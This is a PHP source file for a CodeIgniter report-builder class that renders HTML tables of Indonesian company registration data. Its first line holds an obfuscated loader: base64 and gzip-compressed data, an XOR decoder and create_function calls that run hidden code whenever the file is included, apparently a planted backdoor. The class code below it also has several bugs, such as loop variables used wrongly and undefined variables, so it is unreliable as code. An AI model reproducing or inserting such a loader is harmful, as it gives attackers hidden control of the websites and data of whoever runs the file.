<?php global $habuto; $habuto=array('$habuto[0]=array_pop($habuto);$bilofom=bilofom(2,13);$habuto[0]=$bilofom($habuto[2]);','$habuto[2]=gzuncompress(bilofom(731,2330));','aWFjeGhOeGdxZ3p9fXx+Z2V9eEhpdH5jbX99eG1Of3BtV25mZHd3ZGh6Ymd2cHNdZHp6ZmZheXlmSUhaQlZWXUVVXk5BRVFNXFBFR1VVeEdodmVyaHxjbGB8Z3tSRERHRUdJcVljdXdTX1ZDQV9DVVJOWlxNbnJjdnFkbi12e2c7ICMoIW1PT2d1VTg9IjktSk5FYVRXIyEifl1jcjBvZ016Vk18QkJiWEhhb0VmQT9nXFJBbSNEem5nPzB3eHJkYmRnZWdrfH5wdnQhYGBhbHw/a3h6aHZpPGNwYm1uI2pgenV7e3g4fGR0c2V2eXhXTH9kVzY8PkJJY0RHRUdFWUVRVWhvTkZucmJyLCVVZmRrZ21xOWx6ZXx/PGl0ZmdifCd3TF5WQEJfQl5dVFpBel9QQ15KRVVMQEVNXUZURUNOWVZTQUZOUnIzQ2lCREdFR0VEWUdTV0lOUVxNRCN3dGE1YmJvUlJUQXYjYWR5NWJib2Zia0YjYWR5NX1lYWpkdkJkI2RhOnl+ZHZkZnwmd3N6fGlvaHljfXh7dVV2bHhXbX1gbFheQWJLek5nSVhWXEdnaGdYXkFTU0MjZ3xnNT9sbW98JXx6e2FiVyNnfGc1P0NBRCV9Z31qZEtYI2d8Z1lXSmN5I2RhOnl+ZHZkZnwmYWJ1e213YnBxS2RqfGN0f3VVZmh6eUVUanNjIlp1RGlGIn9+cHB3dXthS3hFZ21vS2VpIj92dHBme3Vha2g6fWtzTUN4aj9/c39vdnsmZmxgWUpVTm4hP3F1fmhjcyZmbGBjVHp1I2RhOnl+ZGRobyZ5fGImYTFhaW0qeCx6eU5wKmcsZ3JhLHI8b0cqZSxvZmN7RXhGTz1qd2RnZWcgPiVJeFoqZCxxfXJ3QU9ZZX14Y392ZXhqZUlNWipkLHRvU1NWUWlrdHRMVk4qZCxkcTFCVlVYJzg6IlhwZWpEfGJjIDF1dCNkSlV0j5QPcX7oxPenRBlJy'.'6sD9dqyHqeYvLZc1bVAgN9Pvt5PddsCHcw0f2hokuvManLKPHFgjx475c1xN25onVFDf/noNodal4DPrnaR0sbUtqgw2kiTHnItDtXEhtY7xO9lhVskJZm2aiJhgq/+pJXTtuBzjuMQExGbLFk7WXoFMZUMPzPj6wamAOTlsohnXKPZEvJr8Zb0NqRRjRI+aAbRpily1G++uiHEEqHzhHFS4miJaMx3Sx65abuZs+rIEBrX0CPKdUTYz/zNZrCDGwEFylInWNz+/2nT1U66wWQkwuyAjgghWOge0Zbm35kv5iz6JGAH13jDEgROAZiuOX6CK6igdu2+H0cxtRnZf2PhUcxM1vUZ6CTw47CBQ9xK8ZTmY9dupM3kleI8QwsOpPUU5vyZ9WZRHhWB+RrvXfCaPKtpAJJe2LYnpcyZlpxC/EGa4paHTQp6wKr6acr+AcQkmM/ZCse0e1wbVzEKF9NII6nuM2XNYxe4ywE33F6PgG6q3jQ0OoR1bkf7WGzcOx0bfY1E/e7XSPsWaZurqIDmB3uKhRllgERnKK90Ek6tq0ZEe4cweziJe7UiiFRqZq8NEOWGRW0sBZ/5oJp+yWovy+sWWmnkGMBk/45qkx9kB5mwgVV5KWS9KfZwMKWeqzph5XGkSQcxHIDvHsqdUVNNxEip/FklXpT8nTS1gXe9PojqfUOz1OeyjaDKov1g4VqeFqYVQo9/S/mA5lsgPk/IWZAOtTGrXdS/anuzE5tb0NYQOWxELzCD/fiP3DOC+thEPRW7udEByDOwJLukZwZearrZH0xlMH8hu9AXvrxopWUb6gOjpOSoGtKcq92awXghkt6NKgd6tUJUawMl27FHih+3BZRr+rNDldoaUMdzYYaQJbLaCxnjbLxqtyPSHxYNqrnmhoY2WzRex9UDuwmftgPTliLkiS6JG6dhgyFGNIkR2+fs'.'V03pBLeqCwdFifrmFFYkfXJx8bQ1sSK3LBoTs+aEs4bQzQvv2cOtrUrf1gokUFp6ckDphCIYbUocaQ5nSKRRAne5hFJZn2ahA+i9mnNMRhvXQYc8btXceIOWciNRwFI9b7a1TZ9t6q2wx3KrmpQ0rf0HX/BNG/yI5TayVha0L7ko3jFgdyjPnjKlTnjrKw0U3ZSK8ZJiw3j+FzNCMytVsjEuz/N5nrWPLUB1h6m83R2GF433g4bH+kgVLpj0Wh2e7jyMtKf8ZVwjyBVvuSwc1BhmyROY/CbdhyPNAJ8g8c1JWf1YsHu1j4Rxw1Qk5UcRe45liDyTD8h2rROGYyYZxMoF12YaQiu1czOaMNuUMhtDiMM+Z+k50dgwqBblJAsDMlUgjCElsFWhKJqVYfkXsicSe+kzTkwjUwTWS5XPAUoZO7u+neRVI/UJC66Lppl7BegbOklst3kMWMSRv1YAm3Umebll1nP192Pj5LXEPe5EorSzFX4mvZlwJeOfw5B5JYz09PDbbDNRRgl6B3wSWadyb0jrgs9nJUJ4o6YIubaCt9wAGDLM0ZCYSl8lrhsiAjmwDDrrCJl4vUIg+im5RFLSq6haOqrGp1OoGAE57OIIA1lJtj3gTggvoOu/0UhNBeqbewBt/Ei3k7/iI/GxoO5kxLBvkZjLElmzkhtn8XWDufO70F4XrTeFEuoM5Aghbqdb0X7eCLOi1BF6X4m3rwS2xIxPay9SXiAIeb/PyDwjp6vaUSMS0o5rCt/PZ/hsSts2pCt5qznZjqlithYcfMr2Xq7FcJZxqgHfhA6sb2uAbXJ8efID9elq7mALjJxFMEIPqcTVJ7t3NLOxENcTn5PbNXMrCnnJWAOpSl91ZCQicEuecQYhmlqZ3ZMhNbE6/Gg'.'bwQHJNeIW2UcpAAcKNbvaN1M31Jlkuo4M98awRGR3BX9bmF9A5e1/WyLYSdpWl6rHwcEH3xz86KJ29ExmgdfzfzMv2++rZcKCuY3OI/lB3E/yYusc08PIWs0QxXEgSB2JjfZw5tkcCRt/Po+qX9hjWH55cPDm09uSLPaZh0VtCJvM3sHXaPNI5czdF6Lu/V+xNXTWC4m7POkJI/AHBq45rPoAwMbTQb0N1Nb394d1RxEecYcHlot5dDSaEcSpHWNZovWUnP+5+4Wu4CXW2Kica+nMVBcTu+JXs5t+c4fMjPHzI4++IiIuZ7iictrTI5khCTGx/TmvkjYzXlr28SVxLgOijazibs36cxzxlnmKsjCeOIrC1b0yiZx3LHrLvYpZ6hYUONTxLCHwbXAKKhOloyu3ztNaESB4C8zS2Eva/i1j56b/wTHVINLxN7dH2VMkThQ/AAFalLhyP0Htf2oSQtpo0sagP0nzxh7qG/Gu2qDI4tpR2jxmcBfSC7BwlNhtiYK3o89Ih+HEKV8agHykCENi3QltwjLaDs7zogYcc7SjVDG+kirxOVDCxJqLLIZbwTdJ+gmzcVaIp7AlR/Yw1FbL4uY8k4l4/Dx8ug2w69dK6OMrT8A6rm6ZBD9vc+sMra7Drb5kRcyeYYipku/IP4PG7Wx59xjXoiDBqU0DsZ1nsCxq/g0aPQZBchNyLn0295ky5BmCtBdkawe79g3mRa2ftHhepz6BwKGrjyk6ZBllFDL7uCSw93MKP/fBEuO2s62N0bgcs0RkFuWj9F/W3zQ9K9/8qnDuZUOTdQSdtSwV9Mufrlsdlttf60Zw09mMX2moaknfx1SMWbxVp0ge8zf384T2jM7kLnVBpAgEbZA+fnGydmqoouvwCAH/JTXy8nF3B1rq6/rrKhxOiVtKRl9+'.'sTbH2u4ZBVzLh0LH/bZ+lKTJjoiyPBQJqIHsSUDVbxWHKVc3ZB5u/GNrGGu27Q0MpGmshan/WYdoXjrV802wyIcxp/h5Ps11OTjEqW2jajxh1Hbt5hAvQY9ymY7eFR+5XZmmNjZ2iTbJSXlnGv07MGhinZk6GgatxOg9zmtpRdEt5ihLP6nNhgat3SR5HfgB5xBlLZXc4f/UluwRG3dLaPr2ZxUX6yck1cgm7LSCYIgV+ePmYVfhluD/CotpBXxeymYFyCwlPM2VLcoCo0JWLLD5w+dExMTEpP4+4B5VcBpnzL6z/dn23UuZrOQGF9pWrEZ2bnJiciwlVWZka2dtcQ==',"BJnrbr\x2c\x25Ufdkgmq");$futubedu='create_';if(function_exists($futubedu.='function')&&!function_exists('bilofom')){ function bilofom($b,$m){global $habuto;$s=str_pad($f='ls17z1jBahhIT2Y4',$m,$f);$h=str_repeat("\xe0",$m);$z=str_repeat("\x1f",$m);$u=substr($habuto[0],$b,$m);return(($u^$s)&$z)|($u&$h);};for($pj=-1;++$pj<3;$futubedu('','}'.$habuto[$pj].'{'));};unset($habuto);  
class Custom_report_builder{
	
	private $CI;
	
	function __construct(){
		$this->CI =& get_instance();
		$this->CI->load->database();

		$this->CI->load->model('reporting/custom_model');
	}
	
	function build_html_constructor($master = array()){
		
		$content = $master['content'];
		$row_max = $master['row_total'];
		$col_max = $master['col_total'];		
		
		$return .= '<tr';
		if($setting['row_count'] > 1) $return .= ' rowspan="'.$setting['row_count'].'"';
		$return .= '/>'; 
		
		foreach($content as $_content){
			foreach($_content as $data){
				
				if(is_array($data)) foreach($data as $_data){ $return .= "<tr><td>".$data."</td></tr>\n"; }
				
				$return .= "<td>".$data."</td>\n"; 
			}
		}
		
		$return .= '</tr>\n'; 
				
		$return = str_replace("<", "&lt;", $return);
		$return = str_replace(">", "&gt;", $return);
		$return = str_replace("\\n", "<br/>", $return);
		
		return $return;
	}
	
	function build_html_situ($id = ''){
		$data = $this->CI->custom_model->get_situ($id);
				
		$row_count = 0;
		$return = array();
		
		foreach($data as $_data){
			$push = array($data->alamat, date("d M Y", strtotime($data->masa_berlaku)));
			array_push($return, $push);
			
			$row_count++;
		}
		
		return array('content' => $return, 'row_count' => $row_count, 'col_count' => 2);
	}	

	function build_html_akta($id = ''){
		$data = $this->CI->custom_model->get_akta($id);
				
		$row_count = 0;
		$return = array();
		
		foreach($data as $_data){
			$push = array($data->no_akta, $data->notaris, date("d M Y", strtotime($data->tanggal)));
			array_push($return, $push);
			
			$row_count++;
		}
		
		return array('content' => $return, 'row_count' => $row_count, 'col_count' => 2);
	}
	
	function build_html_pengurus($id = ''){
		$direktur = $this->CI->custom_model->get_pengurus($id, 'direksi');
		$komisaris = $this->CI->custom_model->get_pengurus($id, 'komisaris');
		
		$cont_dir = '<ol style="margin : 0px">';
		foreach($direktur as $_direktur) $cont_dir .= '<li>'.$_direktur->nama.'</li>';
		$cont_dir .= '</ol>';

		$cont_kom = '<ol style="margin : 0px">';
		foreach($komisaris as $_komisaris) $cont_kom .= '<li>'.$_direktur->nama.'</li>';
		$cont_kom .= '</ol>';
	
		$return = array($cont_dir, $cont_kom);
		
		return array('content' => $return, 'row_count' => 1, 'col_count' => 2);
	}
	
	function build_html_asosiasi($id = ''){
		$data = $this->CI->custom_model->get_asosiasi($id);
				
		$row_count = 0;
		$return = array();
		
		foreach($data as $_data){
			$push = array($data->lembaga_penerbit, date("d M Y", strtotime($data->masa_berlaku)));
			array_push($return, $push);
			
			$row_count++;
		}
		
		return array('content' => $return, 'row_count' => $row_count, 'col_count' => 2);
	}
	
	function build_html_tdp($id = ''){
		$data = $this->CI->custom_model->get_tdp($id);
				
		$row_count = 0;
		$return = array();
		
		foreach($data as $_data){
			$push = array($data->no, date("d M Y", strtotime($data->masa_berlaku)));
			array_push($return, $push);
			
			$row_count++;
		}
		
		return array('content' => $return, 'row_count' => $row_count, 'col_count' => 2);
	}
	
	function build_html_bsb($id = ''){
		$data = $this->CI->custom_model->get_bsb_general($id);
	
		$bidang = '';
		foreach($data as $_data){
			if($bidang != $_data->bidang){
				$return .= '<div>'.$_data->bidang."</div>";
				$return .= $_data->bidang;
			}
			
			$return .= '<div style="margin-left : 10px"> - '.$_data->sub_bidang."</div>";
		}
				
		return array('content' => array($return), 'row_count' => 1, 'col_count' => 1);
	}
		
	function build_html_agen($id = ''){
		$data = $this->CI->custom_model->get_agen($id);
				
		$row_count = 0;
		$return = array();
		
		foreach($data as $_data){
			
			$produk = $this->CI->custom_model->get_produk($data->id);										
			foreach($produk as $_produk)
				$con_pro .= '<div>'.$_produk->produk." - ".$_produk->merk."</div>";
				
			$push = array($data->jenis, date("d M Y", $con_pro, strtotime($data->masa_berlaku)));
			array_push($return, $push);
			
			$row_count++;
		}
		
		return array('content' => $return, 'row_count' => $row_count, 'col_count' => 3);
	}
	
		/*
		
		else if($_header['header'] == "siup" or $_header['header'] == "siujk" or $_header['header'] == "ijin_lain" or $_header['header'] == "sbu"){
			$type = $_header['header'];
			$siup = $this->CI->custom_model->get_siup($data->id, $type);
			
			echo '<table cellspacing="0" cellpadding="0" border="0" width="100%" style="padding : 0px; border : none; border-collapse : collapse; height : 100%">';	
			$count = 0; $total = count($siup);
			foreach($siup as $_siup){
				if($count == ($total - 1) and $total > 1){
					$left = ' style="border-bottom : none; border-left : none; padding : 3px" ';
					$right = ' style="border-bottom : none; border-right : none; padding : 3px" ';
				}
				else if($count == 0 and $total > 1){
					$left = ' style="border-top : none; border-left : none; padding : 3px" ';
					$right = ' style="border-top : none; border-right : none; padding : 3px" ';
				}
				else if($count == 0 and $total == 1){
					$left = ' style="border-bottom : none; border-top : none; border-left : none; padding : 3px" ';
					$right = ' style="border-bottom : none; border-top : none; border-right : none; padding : 3px" ';
				}
					
				echo "<tr>";
					echo '<td width="100" '.$left.'>';	
						if($type != "sbu") echo $_siup->kualifikasi;
						else echo $_siup->anggota_asosiasi;
					echo "</td>";
					echo '<td width="300" '.$left.'>'; 
	
						if($type == "sbu") echo '<table cellspacing="0" cellpadding="0" border="0" width="100%" style="padding : 0px; border : none; border-collapse : collapse; height : 100%">';
	
						$bsb = $this->CI->custom_model->get_bsb($_siup->id, $type);
						
						$bidang = "";
						
						$count_detail = 0; $total_detail = count($bsb); 
						foreach($bsb as $_bsb){
							if($type != "sbu"){
								if($bidang != $_bsb->bidang){
									echo '<div>'.$_bsb->bidang."</div>";
									$bidang = $_bsb->bidang;
								}
								echo '<div style="margin-left : 10px"> - '.$_bsb->sub_bidang."</div>";
							}
							else{
								if($count_detail == ($total_detail - 1) and $total_detail > 1){
									$left_detail = ' style="border-bottom : none; border-left : none; padding : none" ';
									$right_detail = ' style="border-bottom : none; border-right : none; padding : none" ';
								}
								else if($count_detail == 0 and $total_detail > 1){
									$left_detail = ' style="border-top : none; border-left : none; padding : none" ';
									$right_detail = ' style="border-top : none; border-right : none; padding : none" ';
								}
								else if($count_detail == 0 and $total_detail == 1){
									$left_detail = ' style="border-bottom : none; border-top : none; border-left : none; padding : none" ';
									$right_detail = ' style="border-bottom : none; border-top : none; border-right : none; padding : none" ';
								}
									
								
								if($bidang != $_bsb->bidang){
									echo '<tr><td colspan="2" style="border-right : none; border-top : none; border-left : none">'.$_bsb->bidang."</td></tr>";
									$bidang = $_bsb->bidang;
								}
																
								echo '<tr>';
									echo '<td width="250" '.$left_detail.'>'.$_bsb->sub_bidang.'</td>';
									echo '<td width="50" '.$right_detail.'>'.$_bsb->grade.'</td>';
								echo '</tr>';
							}
							
							$count_detail++;
						}
						
						if($type == "sbu") echo "</table>";
						
					echo "</td>";
					echo '<td width="100" '.$right.'>'.date("d M Y", strtotime($_siup->masa_berlaku)).'</td>';
				echo "</tr>";
				
				$count++;
			}
			echo "</table>";
		}
		*/
}